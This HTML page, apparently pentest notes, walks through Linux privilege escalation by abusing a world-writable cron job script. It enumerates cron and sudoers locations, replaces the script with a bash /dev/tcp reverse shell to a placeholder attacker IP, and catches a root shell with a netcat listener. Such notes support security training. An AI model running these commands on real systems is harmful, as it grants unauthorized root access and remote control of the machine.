<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>File Permission misconfiguration</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>File Permission misconfiguration</h1><br/>0. <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;./lse.sh&nbsp;-l&nbsp;1&nbsp;-i&nbsp;|&nbsp;more</div></div><br />    <a href=""><img src="images/1302-1.png" alt="images/1302-1.png" /></a><br />1. View the <span style="color:#1e90ff;">cronJobs</span> of the system-wide crontab:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;cat&nbsp;/etc/crontab</div></div><br />    if we cannot read /etc/crontab check also(automated tools like <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">lse.sh</a> anyway will do that for us):<br />      ▪ /etc/init.d<br />      ▪ /etc/cron*<br />      ▪ /etc/crontab<br />      ▪ /etc/cron.allow<br />      ▪ /etc/cron.d <br />      ▪ /etc/cron.deny<br />      ▪ /etc/cron.daily<br />      ▪ /etc/cron.hourly<br />      ▪ /etc/cron.monthly<br />      ▪ /etc/cron.weekly<br />      ▪ /etc/sudoers<br />      ▪ /etc/exports<br />      ▪ /etc/anacrontab<br />      ▪ /var/spool/cron<br />      ▪ /var/spool/cron/crontabs/root<br />      ▪ command: systemctl list-timers --all<br />       <a href=""><img src="images/1302-2.png" alt="images/1302-2.png" /></a><br />       The asterisks mean “every”. They refers to “minute”(m), “hour”(g), “day of month”(dom), “month”(mon), “days of week”(dow).<br />       These are the <span style="color:#1e90ff;">CronJobs</span>. <br />       In particular the last two are interesting because they run every minute<br />4. Locate the overwrite.sh file on the server<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;locate&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>cronJob<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />    <a href=""><img src="images/1302-3.png" alt="images/1302-3.png" /></a><br />5. Check the file&#39;s permissions and hope that it is world writable<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;ls&nbsp;-l&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>cronJobBinary<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />    <a href=""><img src="images/1302-4.png" alt="images/1302-4.png" /></a><br />    Yes! It is World writable<br />6. Replace the contents of the &lt;cronJobBinary&gt; file with the following:<br />   <div class="codebox"><div class="codebox">#!/bin/bash<br />bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/[IpAttacker]/[port]&nbsp;0&gt;&amp;1</div></div> <br />    <a href=""><img src="images/1302-5.png" alt="images/1302-5.png" /></a><br />    To do that you can use vim<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;vim&nbsp;&lt;cronJobBinary&gt;<br />#&nbsp;i&nbsp;--&gt;&nbsp;insert<br />#Esc&nbsp;--&gt;&nbsp;esc&nbsp;from&nbsp;insert<br />#:w&nbsp;--&gt;&nbsp;write(save)<br />#:q&nbsp;--&gt;&nbsp;exit</div></div><br />7. Run a <span style="text-decoration:underline;">netcat</span> listener on your local machine and wait for the cron job to run.<br />    <div class="codebox"><div class="codebox">attacker@kali:/#&nbsp;&nbsp;nc&nbsp;-nvlp&nbsp;53</div></div><br />     A reverse shell running as the root user should be caught:<br />    <a href=""><img src="images/1302-6.png" alt="images/1302-6.png" /></a></div>
</body>
</html>
